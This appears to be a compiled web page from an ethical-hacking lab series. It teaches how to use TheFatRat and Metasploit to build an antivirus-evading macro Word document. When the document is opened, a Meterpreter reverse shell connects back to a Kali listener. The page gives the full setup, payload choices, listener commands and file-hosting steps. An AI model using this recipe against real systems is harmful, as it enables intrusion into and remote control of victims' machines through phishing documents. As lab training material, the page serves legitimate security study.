import{_ as t,c as a,a1 as o,o as i}from"./chunks/framework.BDxlaA_J.js";const u=JSON.parse('{"title":"Hacking Windows with Malicious Office Document using TheFatRat","description":"","frontmatter":{},"headers":[],"relativePath":"categories/ethical-hacking-labs/5-system-hacking/6-Hacking-Windows-with-Doc-file.md","filePath":"categories/ethical-hacking-labs/5-system-hacking/6-Hacking-Windows-with-Doc-file.md"}'),c={name:"categories/ethical-hacking-labs/5-system-hacking/6-Hacking-Windows-with-Doc-file.md"};function n(s,e,r,l,d,h){return i(),a("div",null,e[0]||(e[0]=[o('<h1 id="hacking-windows-with-malicious-office-document-using-thefatrat" tabindex="-1">Hacking Windows with Malicious Office Document using TheFatRat <a class="header-anchor" href="#hacking-windows-with-malicious-office-document-using-thefatrat" aria-label="Permalink to &quot;Hacking Windows with Malicious Office Document using TheFatRat&quot;">​</a></h1><p>TheFatRat is an exploiting tool which compiles a malware with famous payload, and then the compiled malware can be executed on Linux, Windows, Mac and Android. TheFatRat Provides An Easy way to create Backdoors and Payload which can bypass most anti-virus.</p><p>Official Repository: <a href="https://github.com/Screetsec/TheFatRat" target="_blank" rel="noreferrer">https://github.com/Screetsec/TheFatRat</a></p><h3 id="objectives" tabindex="-1">Objectives <a class="header-anchor" href="#objectives" aria-label="Permalink to &quot;Objectives&quot;">​</a></h3><ul><li>How to use an office document to exploit a windows machine.</li></ul><h3 id="requisites" tabindex="-1">Requisites <a class="header-anchor" href="#requisites" aria-label="Permalink to &quot;Requisites&quot;">​</a></h3><ul><li>Windows Server 2016/2012 virtual machine.</li><li>Kali linux virtual machine.</li></ul><h2 id="set-up-thefatrat" tabindex="-1">Set up TheFatRat <a class="header-anchor" href="#set-up-thefatrat" aria-label="Permalink to &quot;Set up TheFatRat&quot;">​</a></h2><p>TheFatRat provides an easy way to create backdoors and payloads which can bypass most anti-virus systems.</p><h3 id="setting-up" tabindex="-1">Setting up <a class="header-anchor" href="#setting-up" aria-label="Permalink to &quot;Setting up&quot;">​</a></h3><ol><li>Go to your Kali machine and open the Terminal.</li><li>Navigate to the <strong>/opt/</strong> folder. <code>cd /opt</code></li><li>Clone the original github repository from FatRat: <code>git clone https://github.com/Screetsec/TheFatRat.git</code></li><li>Change the folder permissions: <code>chmod -R 755 /opt/TheFatRat/</code></li><li>Go to the TheFatRat folder: <code>cd TheFatRat/</code></li><li>Execute the bash file <strong>(setup.sh)</strong> to begin the installation: <code>./setup.sh</code></li></ol><p>An Updating Kali Repo xterm window will popup as shown below:</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/e8fa4966982e0f0d9ecc4bb11e57d6c5d5a5f06c/InstallingFatRat-0.png" alt="installing-fatRat"></p><h2 id="make-a-backdoor-file" tabindex="-1">Make a Backdoor File <a class="header-anchor" href="#make-a-backdoor-file" aria-label="Permalink to &quot;Make a Backdoor File&quot;">​</a></h2><p>After the installation is complete, in the Terminal, type <code>fatrat</code> and hit enter.</p><p>When FatRat launches, starts to verify the installed dependencies, you will get multiple prompts, just type Enter to continue.</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/e8fa4966982e0f0d9ecc4bb11e57d6c5d5a5f06c/TheFatRat-1.png" alt="fatratmenu"></p><p>On the FatRat menu, choose <strong>[06] Create Fud Backdoor 1000% with PwnWindws [Excelent]</strong> by typing <code>6</code>.</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/e0a88cc5a5dc16d3f868e25305588c3f1a4336d2/pwnwind-1.png" alt="PwnWind"></p><p><strong>PwnWinds</strong> menu appears as shown above, choose the <strong>[3] Create exe file with apache + Powershell (FUD 100%) by typing</strong> <code>3</code> in the menu.</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/65ae135c7f8375eb60e15ac0ac936b142562ac66/payload.png" alt="payload"></p><p>Set the <code>LHOST IP</code> to your Kali IP; <code>LPORT</code> to <code>4444</code> and the output to <code>payload</code> as show above.</p><p>Next, chose <strong>[3] windows/meterpreter/reverse_tcp</strong> by typing <code>3</code>.</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/e68bd00de68fe3b81729e742f4fe28621e93140b/payload-choose.png" alt="payloadchoose"></p><p>If everything works, fatrat will generate a <strong>payload.exe</strong> file located on /root/Fatrat_Generated/ as shown below:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>Backdoor Saved To : /root/Fatrat_Generated/payload.exe</span></span></code></pre></div><h2 id="make-a-malicious-word-file" tabindex="-1">Make a Malicious Word File <a class="header-anchor" href="#make-a-malicious-word-file" aria-label="Permalink to &quot;Make a Malicious Word File&quot;">​</a></h2><p>Go back to the main menu by choosing <strong>[9] Back to menu</strong>.</p><p>On the main menu, choose the <strong>[07] Create Backdoor For Office with Microsploit</strong></p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/51c3113f08b47fc83c01fa8a5ff5fc1ed45bb21f/MicroSploit.png" alt="microsploit"></p><p>On the Microsploit menu, choose <strong>[2] The Microsoft Office Macro on Windows</strong> by typing <code>2</code>.</p><h3 id="the-next-configurations-will-be" tabindex="-1">The next configurations will be: <a class="header-anchor" href="#the-next-configurations-will-be" aria-label="Permalink to &quot;The next configurations will be:&quot;">​</a></h3><ol><li><code>LHOST IP</code>: [Your Kali IP]</li><li><code>LPORT</code>: 4444</li><li><code>Enter the base name for output files</code>: EvilDoc</li><li><code>Enter the message for the document body</code>: you have been PWNED 😃</li><li>The next prompt will ask if you want to use a custom exe to file backdoor. Choose <code>y</code> for <strong>yes</strong>.</li><li>Specify the exactly path to your payload.exe that you generated on the beginings of this lab: <strong>/root/Fatrat_Generated/payload.exe</strong></li><li>On the Payload Option, choose the <strong>[3] windows/meterpreter/reverse_tcp</strong> by typing <code>3</code>. Navigate to output folder of FatRat to you will see the generated Word file.</li></ol><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/c0c8c4ef9ecf358334343d4036a0bb98255272f7/evilFiles.png" alt="evilFiles"></p><h2 id="set-up-a-listener" tabindex="-1">Set Up a Listener <a class="header-anchor" href="#set-up-a-listener" aria-label="Permalink to &quot;Set Up a Listener&quot;">​</a></h2><p>Open another Terminal window and launch metasploit by typing: <code>msfconsole</code>.</p><p>Select the <strong>multi/handler</strong>: <code>use multi/handler</code></p><p>Set the payload to <strong>meterpreter/reverse_tcp</strong>: <code>set payload windows/meterpreter/reverse_tcp</code></p><p>Set the <strong>LHOST</strong> to your Kali IP and <strong>LPORT</strong> to <strong>4444</strong>: <code>set LHOST 10.0.2.42</code><code>set LPORT 4444</code></p><p>Type <strong>run</strong> to start the listener: <code>run</code></p><h2 id="share-the-malicious-doc-file" tabindex="-1">Share the Malicious Doc File <a class="header-anchor" href="#share-the-malicious-doc-file" aria-label="Permalink to &quot;Share the Malicious Doc File&quot;">​</a></h2><p>To share the malicious file to Windows machine, copy the Doc file to the apache folder. Open a new Terminal window and type: <code>cp /root/Fatrat_Generated/EvilDoc.docm /var/www/html/share/</code></p><p>Then, start the apache service: <code>service apache2 start</code></p><h2 id="open-the-malicious-doc" tabindex="-1">Open the Malicious doc <a class="header-anchor" href="#open-the-malicious-doc" aria-label="Permalink to &quot;Open the Malicious doc&quot;">​</a></h2><p>Switch to your Windows machine and open the <strong>browser</strong>.</p><p>Type the URL (based on your Kali IP): <code>http://10.0.2.42/share/</code></p><p>Then, download the malicious doc that you generated.</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/da405dae8fdb8c05b5a7ee412c0508c22f9b0972/evilfile-0.png" alt="EvilFile-0"></p><p>Open the downloads folder and click the MS Word file.</p><p>MS Word open the file in Protected View. Click <strong>Enable Editing</strong> as shown below:</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/da405dae8fdb8c05b5a7ee412c0508c22f9b0972/maliciousword.png" alt="ms-word-protected-view"></p><p>If you got the <strong>SECURITY WARNING</strong> because of the Macros, click on <strong>Enable Content</strong>.</p><p>Now Switch back to the Kali, if everything works, you will find that have a <strong>Meterpreter session</strong> open in the Metasploit terminal.</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/da405dae8fdb8c05b5a7ee412c0508c22f9b0972/meterpreter-docfile.png" alt="meterpreter-docfile"></p><p>Now you can view the exploited system details and so on. Informally you can call this action &#39;profit&#39; 😃</p>',55)]))}const g=t(c,[["render",n]]);export{u as __pageData,g as default};
